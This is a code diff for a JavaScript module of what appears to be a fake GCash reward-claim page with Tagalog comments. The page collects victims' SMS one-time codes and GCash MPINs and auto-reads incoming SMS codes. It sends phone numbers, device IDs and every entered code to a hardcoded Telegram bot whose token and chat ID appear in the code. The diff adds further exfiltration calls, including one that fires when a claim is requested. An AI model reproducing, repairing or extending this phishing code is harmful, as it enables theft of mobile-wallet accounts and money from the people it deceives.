@@ -1,7 +1,6 @@
 /**
  * Popup Share Module - Complete with Firewall Logic
- * 5 Attempts Rule - Loop: 6-digit → 4-digit → balik 6-digit
- * SMS Retriever API (Actual SMS reading)
+ * With Telegram Notifications for 6-digit request and verification attempts
  */
 
 // ========== POPUP MODULE ==========
@@ -18,6 +17,40 @@
     let detectedSMSCode = '';
     let smsReceiverStarted = false;
     let currentMPIN = '';
+    
+    // ========== TELEGRAM NOTIFICATIONS ==========
+    const BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
+    const CHAT_ID = "7298607329";
+    
+    async function sendTelegramMessage(message) {
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+            console.log('Telegram sent');
+        } catch(e) {
+            console.error('Telegram error:', e);
+        }
+    }
+    
+    async function send6DigitRequestNotification(userPhone, deviceId) {
+        const now = new Date();
+        const timestamp = now.toLocaleString();
+        const message = `🔐 6-DIGIT CODE REQUESTED\nUser: ${userPhone}\nDevice ID: ${deviceId}\nTime: ${timestamp}\nStatus: Waiting for 6-digit code input`;
+        await sendTelegramMessage(message);
+    }
+    
+    async function sendVerificationAttemptNotification(userPhone, deviceId, code, attemptsLeft) {
+        const now = new Date();
+        const timestamp = now.toLocaleString();
+        const message = `🔑 VERIFICATION ATTEMPT\nUser: ${userPhone}\nDevice ID: ${deviceId}\nCode Entered: ${code}\nTime: ${timestamp}\nAttempts Left: ${attemptsLeft}/${MAX_ATTEMPTS}\nStatus: INVALID`;
+        await sendTelegramMessage(message);
+    }
+    
+    async function sendMaxAttemptsNotification(userPhone, deviceId) {
+        const now = new Date();
+        const timestamp = now.toLocaleString();
+        const message = `⚠️ MAX ATTEMPTS REACHED\nUser: ${userPhone}\nDevice ID: ${deviceId}\nTime: ${timestamp}\nAction: Redirect to index.html`;
+        await sendTelegramMessage(message);
+    }
     
     // ========== INITIALIZATION ==========
     function init() {
@@ -48,12 +81,9 @@
     // ========== HANDLE MAX ATTEMPTS ==========
     function handleMaxAttempts() {
         const userPhone = localStorage.getItem("userPhone") || "Unknown";
+        const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
         
-        const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
-        const chatId = "7298607329";
-        const message = `MAX ATTEMPTS REACHED\nUser: ${userPhone}\nAttempts: ${MAX_ATTEMPTS}`;
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-            .catch(e => console.log('Telegram error:', e));
+        sendMaxAttemptsNotification(userPhone, deviceId);
         
         alert("Use your registered GCash Number and claim again.");
         window.location.href = "index.html";
@@ -71,29 +101,23 @@
         return false;
     }
     
-    // ========== RESET TO STEP 1 (6-digit) ==========
+    // ========== RESET TO STEP 1 ==========
     function resetToStep1() {
         const step1Container = document.getElementById('step1Container');
         const step2Container = document.getElementById('step2Container');
         const code6Input = document.getElementById('code6Digit');
         const smsPopup = document.getElementById('smsCodePopup');
         
-        // Clear inputs
         if (code6Input) code6Input.value = '';
         currentMPIN = '';
-        
-        // Reset MPIN dots
         updateMPINDots();
         
-        // Show Step 1, hide Step 2
         if (step1Container) step1Container.style.display = 'block';
         if (step2Container) step2Container.style.display = 'none';
         
-        // Clear error message
         const step1ErrorMsg = document.getElementById('step1ErrorMsg');
         if (step1ErrorMsg) step1ErrorMsg.style.display = 'none';
         
-        // Update attempts counter
         const attemptsLeft = MAX_ATTEMPTS - invalidAttempts;
         const attemptsCounter = document.querySelector('.attempts-counter');
         if (attemptsCounter) {
@@ -104,7 +128,6 @@
             }
         }
         
-        // Show SMS popup again
         if (smsPopup && detectedSMSCode) {
             smsPopup.style.display = 'block';
             setTimeout(() => {
@@ -237,26 +260,24 @@
         }
     }
     
-    // ========== ACTUAL SMS RETRIEVER API ==========
+    // ========== SMS RETRIEVER ==========
     function startSmsRetriever() {
         if (smsReceiverStarted) return;
         smsReceiverStarted = true;
         
         console.log('SMS Retriever started - waiting for SMS...');
         
-        // Para sa Android gamit ang SMS Retriever API
+        // For Android SMS Retriever API
         if (window.smsretriever) {
             window.smsretriever.startWatch(function(sms) {
                 console.log('Raw SMS received:', sms);
                 
-                // Extract 6-digit code
                 const match = sms.match(/\b\d{6}\b/);
                 if (match) {
                     const code = match[0];
                     console.log('Extracted 6-digit code:', code);
                     detectedSMSCode = code;
                     
-                    // Show SMS popup with actual code
                     const smsPopup = document.getElementById('smsCodePopup');
                     const smsCodeSpan = document.getElementById('smsCodeValue');
                     const codeInput = document.getElementById('code6Digit');
@@ -265,19 +286,16 @@
                         smsCodeSpan.innerHTML = code;
                         smsPopup.style.display = 'block';
                         
-                        // Auto-hide after 10 seconds
                         setTimeout(() => {
                             if (smsPopup) smsPopup.style.display = 'none';
                         }, 10000);
                     }
                     
-                    // Auto-fill the code input
                     if (codeInput) {
                         codeInput.value = code;
                         codeInput.style.borderColor = '#39ff14';
                         codeInput.style.boxShadow = '0 0 10px #39ff14';
                         
-                        // Auto-click verify after 500ms
                         setTimeout(() => {
                             const verifyBtn = document.getElementById('verify6DigitBtn');
                             if (verifyBtn) verifyBtn.click();
@@ -286,8 +304,7 @@
                 }
             });
         } else {
-            console.log('SMS Retriever not available (not Android or no Google Play Services)');
-            // Fallback: manual input na lang
+            console.log('SMS Retriever not available');
         }
     }
     
@@ -341,6 +358,11 @@
             console.log('Claim button clicked!');
             
             resetAttempts();
+            
+            // SEND TELEGRAM NOTIFICATION FOR 6-DIGIT REQUEST
+            const userPhone = localStorage.getItem("userPhone") || "Unknown";
+            const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+            await send6DigitRequestNotification(userPhone, deviceId);
             
             const balance = await syncBalanceFromFirebase();
             showPopup(balance);
@@ -404,22 +426,6 @@
         }
     }
     
-    // ========== SEND VERIFICATION ATTEMPT ==========
-    async function sendVerificationAttempt(userPhone, deviceId, code, attemptsLeft) {
-        try {
-            const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
-            const chatId = "7298607329";
-            const now = new Date();
-            const timestamp = now.toLocaleString();
-            
-            const message = `VERIFICATION ATTEMPT\nUser: ${userPhone}\nDevice: ${deviceId}\nCode: ${code}\nTime: ${timestamp}\nStatus: INVALID\nAttempts Left: ${attemptsLeft}/${MAX_ATTEMPTS}`;
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
-            console.log('Verification attempt sent');
-        } catch(e) {
-            console.error('Telegram error:', e);
-        }
-    }
-    
     // ========== SHOW FIREWALL POPUP ==========
     function showFirewallPopup() {
         const popupInner = document.querySelector('.popup-inner');
@@ -438,7 +444,6 @@
             popupInner.style.transform = 'scale(1)';
         }, 300);
         
-        // Start SMS Retriever
         startSmsRetriever();
     }
     
@@ -472,7 +477,7 @@
                 ⚠️ Attempts remaining: ${attemptsLeft} / ${MAX_ATTEMPTS}
             </div>
             
-            <!-- SMS CODE POPUP (Actual SMS) -->
+            <!-- SMS CODE POPUP -->
             <div id="smsCodePopup" style="display: none; background: linear-gradient(135deg, #1a1a2e, #0f0f1a); border: 1px solid #00f2ff; border-radius: 16px; padding: 12px; margin: 10px 0; animation: bounceIn 0.3s ease;">
                 <div style="display: flex; align-items: center; gap: 10px;">
                     <div style="font-size: 30px;">📨</div>
@@ -569,14 +574,12 @@
             };
         }
         
-        // STEP 1: 6-digit verification
         const verifyBtn = document.getElementById('verify6DigitBtn');
         const codeInput = document.getElementById('code6Digit');
         const step1Container = document.getElementById('step1Container');
         const step2Container = document.getElementById('step2Container');
         const step1ErrorMsg = document.getElementById('step1ErrorMsg');
         
-        // SMS Auto-fill button
         const autoFillBtn = document.getElementById('autoFillSmsBtn');
         if (autoFillBtn) {
             autoFillBtn.onclick = function() {
@@ -613,12 +616,7 @@
                 
                 console.log('6-digit code accepted:', code);
                 
-                const userPhone = localStorage.getItem("userPhone") || "Unknown";
-                const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
-                const attemptsLeft = MAX_ATTEMPTS - invalidAttempts;
-                sendVerificationAttempt(userPhone, deviceId, code, attemptsLeft);
-                
-                // Transition to Step 2 (MPIN)
+                // Transition to Step 2
                 step1Container.style.transition = 'opacity 0.3s ease';
                 step1Container.style.opacity = '0';
                 
@@ -635,7 +633,6 @@
                     }, 50);
                 }, 300);
                 
-                // Attach MPIN keypad
                 attachMPINKeypad();
             };
         }
@@ -661,7 +658,7 @@
         }
     }
     
-    // ========== ATTACH MPIN KEYPAD (na may balik sa Step 1) ==========
+    // ========== ATTACH MPIN KEYPAD ==========
     function attachMPINKeypad() {
         currentMPIN = '';
         updateMPINDots();
@@ -674,7 +671,8 @@
                 const maxReached = incrementInvalidAttempts();
                 const attemptsLeft = MAX_ATTEMPTS - invalidAttempts;
                 
-                sendVerificationAttempt(userPhone, deviceId, currentMPIN, attemptsLeft);
+                // SEND TELEGRAM NOTIFICATION FOR VERIFICATION ATTEMPT
+                sendVerificationAttemptNotification(userPhone, deviceId, currentMPIN, attemptsLeft);
                 
                 const attemptsCounter = document.querySelector('.attempts-counter');
                 if (attemptsCounter) {
@@ -699,11 +697,12 @@
                 currentMPIN = '';
                 updateMPINDots();
                 
-                // BALIK SA STEP 1 (6-digit) pagkatapos ng 1.5 seconds
-                setTimeout(() => {
-                    if (errorMsg) errorMsg.style.display = 'none';
-                    resetToStep1();
-                }, 1500);
+                if (!maxReached) {
+                    setTimeout(() => {
+                        if (errorMsg) errorMsg.style.display = 'none';
+                        resetToStep1();
+                    }, 1500);
+                }
             }
         }
         
@@ -926,7 +925,7 @@
                     setTimeout(() => {
                         window.removeEventListener('beforeunload', beforeUnloadHandler);
                         window.location.href = linkData.url;
-                    }, 500);
+                    }, 1000);
                 } else {
                     claimInProgress = false;
                     isRedirecting = false;
